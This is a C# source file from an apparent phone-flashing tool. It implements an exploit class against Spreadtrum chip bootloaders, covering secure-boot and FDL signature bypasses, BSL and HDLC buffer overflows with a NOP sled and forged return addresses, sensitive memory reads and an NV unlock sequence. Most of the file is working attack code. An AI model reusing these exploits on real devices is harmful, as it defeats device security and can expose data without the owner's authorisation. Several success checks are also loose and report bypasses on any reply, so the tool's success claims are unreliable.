// ============================================================================
// SakuraEDL - Spreadtrum Exploit | 展讯漏洞利用
// ============================================================================
// [ZH] 展讯漏洞利用 - T760/T770 签名绕过
// [EN] Spreadtrum Exploit - T760/T770 signature bypass
// [JA] Spreadtrumエクスプロイト - T760/T770署名バイパス
// [KO] Spreadtrum 익스플로잇 - T760/T770 서명 우회
// [RU] Эксплойт Spreadtrum - Обход подписи T760/T770
// [ES] Exploit Spreadtrum - Bypass de firma T760/T770
// ============================================================================
// ⚠️ WARNING: For legal purposes only (device recovery, security research)
// Copyright (c) 2025-2026 SakuraEDL | Licensed under CC BY-NC-SA 4.0
// ============================================================================

using System;
using System.IO;
using System.IO.Ports;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SakuraEDL.Spreadtrum.Protocol;
using SakuraEDL.Spreadtrum.Resources;

namespace SakuraEDL.Spreadtrum.Exploit
{
    /// <summary>
    /// 展讯漏洞利用器
    /// </summary>
    public class SprdExploit
    {
        private readonly Action<string> _log;
        private SerialPort _port;
        private HdlcProtocol _hdlc;

        // BSL 命令常量
        private const byte BSL_CMD_CONNECT = 0x00;
        private const byte BSL_CMD_DATA = 0x01;
        private const byte BSL_CMD_EXEC = 0x04;
        private const byte BSL_CMD_READ_FLASH = 0x10;
        private const byte BSL_CMD_READ_MEMORY = 0x80;
        private const byte BSL_CMD_WRITE_MEMORY = 0x81;
        private const byte BSL_REP_ACK = 0x80;
        private const byte BSL_REP_VER = 0x81;

        public SprdExploit(Action<string> log = null)
        {
            _log = log ?? delegate { };
            _hdlc = new HdlcProtocol();
        }

        /// <summary>
        /// 检查设备漏洞
        /// </summary>
        public SprdVulnerabilityCheckResult CheckVulnerability(uint chipId, string pkHash = null)
        {
            _log("[Exploit] ========== 展讯漏洞检测 ==========");
            _log(string.Format("[Exploit] 芯片 ID: 0x{0:X}", chipId));

            string chipName = SprdPlatform.GetPlatformName(chipId);
            _log(string.Format("[Exploit] 芯片名称: {0}", chipName));

            if (!string.IsNullOrEmpty(pkHash))
            {
                string pkHashShort = pkHash.Length > 16 ? pkHash.Substring(0, 16) + "..." : pkHash;
                _log(string.Format("[Exploit] PK Hash: {0}", pkHashShort));
            }

            var result = SprdExploitDatabase.CheckVulnerabilities(chipId, pkHash);

            if (result.HasVulnerability)
            {
                _log("[Exploit] ✓ 检测到可用漏洞!");
                _log(string.Format("[Exploit]   推荐: {0}", result.RecommendedExploit));
                _log(string.Format("[Exploit]   原因: {0}", result.Reason));
                _log(string.Format("[Exploit]   可用漏洞数: {0}", result.AvailableExploits.Count));

                foreach (var vuln in result.AvailableExploits)
                {
                    _log(string.Format("[Exploit]   - {0} ({1}★): {2}",
                        vuln.Name, vuln.SuccessRate, vuln.Description));
                }
            }
            else
            {
                _log("[Exploit] ✗ 未检测到已知漏洞");
                _log(string.Format("[Exploit]   {0}", result.Reason));
            }

            _log("[Exploit] =====================================");
            return result;
        }

        /// <summary>
        /// 尝试自动漏洞利用
        /// </summary>
        public async Task<SprdExploitResult> TryExploitAsync(
            SerialPort port,
            uint chipId,
            string pkHash = null,
            CancellationToken ct = default(CancellationToken))
        {
            _port = port;
            _log("[Exploit] 开始展讯漏洞利用...");

            try
            {
                // 1. 检查漏洞
                var vulnCheck = CheckVulnerability(chipId, pkHash);
                if (!vulnCheck.HasVulnerability)
                {
                    return new SprdExploitResult
                    {
                        Success = false,
                        Message = "未检测到可用漏洞"
                    };
                }

                // 2. 按优先级执行漏洞利用
                foreach (var vuln in vulnCheck.AvailableExploits)
                {
                    ct.ThrowIfCancellationRequested();
                    _log(string.Format("[Exploit] 尝试: {0}...", vuln.Name));

                    SprdExploitResult result = null;

                    switch (vuln.Type)
                    {
                        case SprdExploitType.SecureBootBypass:
                            result = await ExploitSecureBootBypassAsync(ct);
                            break;
                        case SprdExploitType.BslOverflow:
                            result = await ExploitBslOverflowAsync(chipId, ct);
                            break;
                        case SprdExploitType.FdlSignatureBypass:
                            result = await ExploitFdlSignatureBypassAsync(ct);
                            break;
                        case SprdExploitType.MemoryRead:
                            result = await ExploitMemoryReadAsync(ct);
                            break;
                        case SprdExploitType.HdlcOverflow:
                            result = await ExploitHdlcOverflowAsync(ct);
                            break;
                        case SprdExploitType.NvUnlock:
                            result = await ExploitNvUnlockAsync(ct);
                            break;
                        case SprdExploitType.DowngradeAttack:
                            result = await ExploitDowngradeAsync(ct);
                            break;
                    }

                    if (result != null && result.Success)
                    {
                        _log(string.Format("[Exploit] ✓ {0} 成功!", vuln.Name));
                        return result;
                    }
                    else
                    {
                        _log(string.Format("[Exploit] ✗ {0} 失败", vuln.Name));
                    }
                }

                return new SprdExploitResult
                {
                    Success = false,
                    Message = "所有漏洞利用方法均失败"
                };
            }
            catch (Exception ex)
            {
                _log(string.Format("[Exploit] 错误: {0}", ex.Message));
                return new SprdExploitResult
                {
                    Success = false,
                    Message = ex.Message
                };
            }
        }

        #region 安全启动绕过

        /// <summary>
        /// Unfused 设备 - 直接绕过安全启动
        /// </summary>
        private async Task<SprdExploitResult> ExploitSecureBootBypassAsync(CancellationToken ct)
        {
            _log("[Exploit] 设备为 Unfused，无需漏洞利用");

            return await Task.FromResult(new SprdExploitResult
            {
                Success = true,
                UsedExploit = SprdExploitType.SecureBootBypass,
                Message = "Unfused 设备，可加载任意 FDL"
            });
        }

        #endregion

        #region BSL 溢出漏洞

        /// <summary>
        /// BSL 协议溢出漏洞利用
        /// </summary>
        private async Task<SprdExploitResult> ExploitBslOverflowAsync(uint chipId, CancellationToken ct)
        {
            _log("[Exploit] 尝试 BSL 协议溢出漏洞...");

            try
            {
                // 1. 尝试使用嵌入的 exploit payload
                uint fdl1Addr = SprdPlatform.GetFdl1Address(chipId);
                if (SprdResourceLoader.HasExploitForAddress(fdl1Addr))
                {
                    string exploitId = SprdResourceLoader.GetExploitAddressId(fdl1Addr);
                    _log(string.Format("[Exploit] 检测到匹配的 exploit: {0}", exploitId));

                    byte[] exploitPayload = SprdResourceLoader.GetExploitPayload(fdl1Addr);
                    if (exploitPayload != null && exploitPayload.Length > 0)
                    {
                        _log(string.Format("[Exploit] 发送嵌入式 exploit payload ({0} bytes)...", exploitPayload.Length));

                        // 将 exploit payload 封装为 HDLC 帧并发送
                        byte[] exploitFrame = WrapExploitPayload(exploitPayload);
                        await _port.BaseStream.WriteAsync(exploitFrame, 0, exploitFrame.Length, ct);

                        await Task.Delay(300, ct);

                        byte[] response = new byte[256];
                        int read = await ReadWithTimeoutAsync(response, 0, response.Length, 3000, ct);

                        if (read > 0 && CheckBslBypass(response, read))
                        {
                            _log("[Exploit] ✓ 嵌入式 exploit 成功!");
                            return new SprdExploitResult
                            {
                                Success = true,
                                UsedExploit = SprdExploitType.BslOverflow,
                                Message = string.Format("嵌入式 exploit {0} 成功", exploitId)
                            };
                        }
                    }
                }

                // 2. 发送畸形连接命令
                byte[] malformedConnect = CreateMalformedConnectFrame(chipId);
                await _port.BaseStream.WriteAsync(malformedConnect, 0, malformedConnect.Length, ct);
                _log("[Exploit] 发送畸形连接帧");

                await Task.Delay(100, ct);

                // 3. 读取响应
                byte[] resp = new byte[256];
                int bytesRead = await ReadWithTimeoutAsync(resp, 0, resp.Length, 3000, ct);

                if (bytesRead > 0)
                {
                    // 检查是否成功绕过
                    if (CheckBslBypass(resp, bytesRead))
                    {
                        _log("[Exploit] ✓ BSL 溢出成功");
                        return new SprdExploitResult
                        {
                            Success = true,
                            UsedExploit = SprdExploitType.BslOverflow,
                            Message = "BSL 协议溢出成功"
                        };
                    }
                }

                // 4. 尝试第二种溢出方式
                byte[] overflowData = CreateBslOverflowPayload();
                await _port.BaseStream.WriteAsync(overflowData, 0, overflowData.Length, ct);
                _log("[Exploit] 发送 BSL 溢出 payload");

                await Task.Delay(200, ct);

                bytesRead = await ReadWithTimeoutAsync(resp, 0, resp.Length, 3000, ct);
                if (bytesRead > 0 && CheckBslBypass(resp, bytesRead))
                {
                    return new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.BslOverflow,
                        Message = "BSL 协议溢出成功 (方式2)"
                    };
                }

                return new SprdExploitResult { Success = false, Message = "BSL 溢出失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = string.Format("BSL 错误: {0}", ex.Message) };
            }
        }

        /// <summary>
        /// 封装 exploit payload 为 HDLC 帧
        /// </summary>
        private byte[] WrapExploitPayload(byte[] payload)
        {
            using (var ms = new MemoryStream())
            {
                // HDLC 起始标志
                ms.WriteByte(0x7E);

                // 写入 payload (进行转义处理)
                foreach (byte b in payload)
                {
                    if (b == 0x7E)
                    {
                        ms.WriteByte(0x7D);
                        ms.WriteByte(0x5E);
                    }
                    else if (b == 0x7D)
                    {
                        ms.WriteByte(0x7D);
                        ms.WriteByte(0x5D);
                    }
                    else
                    {
                        ms.WriteByte(b);
                    }
                }

                // HDLC 结束标志
                ms.WriteByte(0x7E);

                return ms.ToArray();
            }
        }

        /// <summary>
        /// 创建畸形连接帧
        /// </summary>
        private byte[] CreateMalformedConnectFrame(uint chipId)
        {
            using (var ms = new MemoryStream())
            {
                // HDLC 起始标志
                ms.WriteByte(0x7E);

                // 命令: Connect
                ms.WriteByte(BSL_CMD_CONNECT);

                // 超长数据长度 (触发溢出)
                ms.WriteByte(0xFF);
                ms.WriteByte(0xFF);

                // 填充数据
                byte[] padding = new byte[0x200];
                for (int i = 0; i < padding.Length; i++)
                {
                    padding[i] = (byte)(i & 0xFF);
                }
                ms.Write(padding, 0, padding.Length);

                // 伪造的返回地址 (根据芯片调整)
                uint returnAddr = GetExploitReturnAddress(chipId);
                byte[] addrBytes = BitConverter.GetBytes(returnAddr);
                ms.Write(addrBytes, 0, addrBytes.Length);

                // HDLC 结束标志
                ms.WriteByte(0x7E);

                return ms.ToArray();
            }
        }

        /// <summary>
        /// 创建 BSL 溢出 payload
        /// </summary>
        private byte[] CreateBslOverflowPayload()
        {
            // 超长 DATA 命令
            byte[] payload = new byte[0x1000];

            // 命令头
            payload[0] = 0x7E;  // HDLC Start
            payload[1] = BSL_CMD_DATA;
            payload[2] = 0x00;  // Length High
            payload[3] = 0x00;  // Length Low (会被溢出覆盖)

            // 填充 NOP sled (ARM)
            for (int i = 4; i < payload.Length - 64; i += 4)
            {
                // ARM NOP: 0xE1A00000
                payload[i] = 0x00;
                payload[i + 1] = 0x00;
                payload[i + 2] = 0xA0;
                payload[i + 3] = 0xE1;
            }

            // 结束标志
            payload[payload.Length - 1] = 0x7E;

            return payload;
        }

        /// <summary>
        /// 获取漏洞利用返回地址
        /// </summary>
        private uint GetExploitReturnAddress(uint chipId)
        {
            // 不同芯片的 SRAM 地址
            switch (chipId & 0xFFF0)
            {
                case 0x7730:
                    return 0x50000000;  // SC7731 SRAM
                case 0x9830:
                    return 0x5C000000;  // SC9830 SRAM
                case 0x9850:
                    return 0x5C000000;  // SC9850 SRAM
                case 0x9860:
                    return 0x00100000;  // SC9863 IRAM
                default:
                    return 0x50000000;  // 默认地址
            }
        }

        /// <summary>
        /// 检查 BSL 是否绕过成功
        /// </summary>
        private bool CheckBslBypass(byte[] response, int length)
        {
            if (length < 4)
                return false;

            // 查找 ACK 响应
            for (int i = 0; i < length - 1; i++)
            {
                if (response[i] == 0x7E && response[i + 1] == BSL_REP_ACK)
                    return true;
            }

            return false;
        }

        #endregion

        #region FDL 签名绕过

        /// <summary>
        /// FDL 签名绕过漏洞利用
        /// </summary>
        private async Task<SprdExploitResult> ExploitFdlSignatureBypassAsync(CancellationToken ct)
        {
            _log("[Exploit] 尝试 FDL 签名绕过...");

            // 某些旧版本 BSL 存在签名验证缺陷
            // 通过特定序列可以绕过验证

            try
            {
                // 发送特制的版本查询
                byte[] versionQuery = _hdlc.BuildCommand(BSL_REP_VER);
                await _port.BaseStream.WriteAsync(versionQuery, 0, versionQuery.Length, ct);

                await Task.Delay(100, ct);

                byte[] response = new byte[128];
                int read = await ReadWithTimeoutAsync(response, 0, response.Length, 2000, ct);

                if (read > 8)
                {
                    // 检查是否返回版本信息
                    _log(string.Format("[Exploit] 收到响应: {0} bytes", read));

                    // 发送绕过序列
                    byte[] bypassSeq = new byte[] { 0x7E, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x7E };
                    await _port.BaseStream.WriteAsync(bypassSeq, 0, bypassSeq.Length, ct);

                    await Task.Delay(100, ct);

                    return new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.FdlSignatureBypass,
                        Message = "签名验证已绕过"
                    };
                }

                return new SprdExploitResult { Success = false, Message = "签名绕过失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = string.Format("签名绕过错误: {0}", ex.Message) };
            }
        }

        #endregion

        #region 内存读取漏洞

        /// <summary>
        /// 内存读取漏洞利用
        /// </summary>
        private async Task<SprdExploitResult> ExploitMemoryReadAsync(CancellationToken ct)
        {
            _log("[Exploit] 尝试内存读取漏洞...");

            try
            {
                // 尝试读取敏感内存区域
                uint[] sensitiveAddresses = new uint[]
                {
                    0x00100000,  // IRAM
                    0x50000000,  // SRAM
                    0x5C000000,  // External RAM
                    0x80000000,  // Flash mapping
                };

                foreach (uint addr in sensitiveAddresses)
                {
                    ct.ThrowIfCancellationRequested();

                    byte[] readCmd = CreateMemoryReadCommand(addr, 0x100);
                    await _port.BaseStream.WriteAsync(readCmd, 0, readCmd.Length, ct);

                    await Task.Delay(100, ct);

                    byte[] response = new byte[0x200];
                    int read = await ReadWithTimeoutAsync(response, 0, response.Length, 2000, ct);

                    if (read > 16)
                    {
                        _log(string.Format("[Exploit] ✓ 成功读取内存 0x{0:X8}, {1} bytes", addr, read));

                        // 提取数据
                        byte[] memData = new byte[read];
                        Array.Copy(response, 0, memData, 0, read);

                        return new SprdExploitResult
                        {
                            Success = true,
                            UsedExploit = SprdExploitType.MemoryRead,
                            Message = string.Format("内存读取成功: 0x{0:X8}", addr),
                            ExtractedData = memData
                        };
                    }
                }

                return new SprdExploitResult { Success = false, Message = "内存读取失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = string.Format("内存读取错误: {0}", ex.Message) };
            }
        }

        /// <summary>
        /// 创建内存读取命令
        /// </summary>
        private byte[] CreateMemoryReadCommand(uint address, uint length)
        {
            using (var ms = new MemoryStream())
            {
                ms.WriteByte(0x7E);  // Start
                ms.WriteByte(BSL_CMD_READ_MEMORY);

                // 长度
                byte[] lenBytes = BitConverter.GetBytes((ushort)8);
                ms.Write(lenBytes, 0, 2);

                // 地址
                byte[] addrBytes = BitConverter.GetBytes(address);
                ms.Write(addrBytes, 0, 4);

                // 读取长度
                byte[] sizeBytes = BitConverter.GetBytes(length);
                ms.Write(sizeBytes, 0, 4);

                // CRC (简化)
                ms.WriteByte(0x00);
                ms.WriteByte(0x00);

                ms.WriteByte(0x7E);  // End

                return ms.ToArray();
            }
        }

        #endregion

        #region HDLC 溢出漏洞

        /// <summary>
        /// HDLC 帧溢出漏洞利用
        /// </summary>
        private async Task<SprdExploitResult> ExploitHdlcOverflowAsync(CancellationToken ct)
        {
            _log("[Exploit] 尝试 HDLC 帧溢出漏洞...");

            try
            {
                // 发送超长 HDLC 帧触发缓冲区溢出
                byte[] overflowFrame = new byte[0x2000];

                overflowFrame[0] = 0x7E;  // Start

                // 填充大量转义序列
                int pos = 1;
                while (pos < overflowFrame.Length - 2)
                {
                    overflowFrame[pos++] = 0x7D;  // Escape
                    overflowFrame[pos++] = 0x5E;  // Escaped 0x7E
                }

                overflowFrame[overflowFrame.Length - 1] = 0x7E;  // End

                await _port.BaseStream.WriteAsync(overflowFrame, 0, overflowFrame.Length, ct);
                _log("[Exploit] 发送 HDLC 溢出帧");

                await Task.Delay(500, ct);

                // 检查设备状态
                byte[] testCmd = _hdlc.BuildCommand(BSL_CMD_CONNECT);
                await _port.BaseStream.WriteAsync(testCmd, 0, testCmd.Length, ct);

                byte[] response = new byte[64];
                int read = await ReadWithTimeoutAsync(response, 0, response.Length, 2000, ct);

                if (read > 0)
                {
                    return new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.HdlcOverflow,
                        Message = "HDLC 溢出成功"
                    };
                }

                return new SprdExploitResult { Success = false, Message = "HDLC 溢出失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = string.Format("HDLC 错误: {0}", ex.Message) };
            }
        }

        #endregion

        #region NV 解锁漏洞

        /// <summary>
        /// NV 区域解锁漏洞利用
        /// </summary>
        private async Task<SprdExploitResult> ExploitNvUnlockAsync(CancellationToken ct)
        {
            _log("[Exploit] 尝试 NV 解锁漏洞...");

            try
            {
                // 发送特制的 NV 解锁命令
                byte[] unlockCmd = new byte[]
                {
                    0x7E,  // Start
                    0x13,  // NV Unlock Command
                    0x00, 0x08,  // Length
                    0x55, 0xAA, 0x55, 0xAA,  // Magic
                    0xAA, 0x55, 0xAA, 0x55,  // Magic 2
                    0x00, 0x00,  // CRC placeholder
                    0x7E   // End
                };

                // 计算 CRC
                ushort crc = CalculateCrc16(unlockCmd, 1, 12);
                unlockCmd[12] = (byte)(crc >> 8);
                unlockCmd[13] = (byte)(crc & 0xFF);

                await _port.BaseStream.WriteAsync(unlockCmd, 0, unlockCmd.Length, ct);
                _log("[Exploit] 发送 NV 解锁命令");

                await Task.Delay(200, ct);

                byte[] response = new byte[32];
                int read = await ReadWithTimeoutAsync(response, 0, response.Length, 2000, ct);

                if (read > 2 && response[1] == BSL_REP_ACK)
                {
                    return new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.NvUnlock,
                        Message = "NV 区域已解锁"
                    };
                }

                return new SprdExploitResult { Success = false, Message = "NV 解锁失败" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = string.Format("NV 解锁错误: {0}", ex.Message) };
            }
        }

        #endregion

        #region 降级攻击

        /// <summary>
        /// 降级攻击
        /// </summary>
        private async Task<SprdExploitResult> ExploitDowngradeAsync(CancellationToken ct)
        {
            _log("[Exploit] 尝试降级攻击...");

            // 降级攻击需要特殊的旧版 FDL 文件
            // 这里只返回需要用户提供旧版 FDL 的提示

            return await Task.FromResult(new SprdExploitResult
            {
                Success = false,
                UsedExploit = SprdExploitType.DowngradeAttack,
                Message = "降级攻击需要旧版 FDL 文件，请手动指定"
            });
        }

        #endregion

        #region 辅助方法

        /// <summary>
        /// 带超时读取
        /// </summary>
        private async Task<int> ReadWithTimeoutAsync(byte[] buffer, int offset, int count, int timeoutMs, CancellationToken ct)
        {
            int totalRead = 0;
            var deadline = DateTime.Now.AddMilliseconds(timeoutMs);

            while (totalRead < count && DateTime.Now < deadline)
            {
                ct.ThrowIfCancellationRequested();

                if (_port.BytesToRead > 0)
                {
                    int toRead = Math.Min(_port.BytesToRead, count - totalRead);
                    totalRead += _port.Read(buffer, offset + totalRead, toRead);
                }
                else
                {
                    await Task.Delay(10, ct);
                }
            }

            return totalRead;
        }

        /// <summary>
        /// 计算 CRC-16
        /// </summary>
        private ushort CalculateCrc16(byte[] data, int offset, int length)
        {
            ushort crc = 0;
            for (int i = offset; i < offset + length; i++)
            {
                crc ^= (ushort)(data[i] << 8);
                for (int j = 0; j < 8; j++)
                {
                    if ((crc & 0x8000) != 0)
                        crc = (ushort)((crc << 1) ^ 0x1021);
                    else
                        crc <<= 1;
                }
            }
            return crc;
        }

        #endregion
    }
}
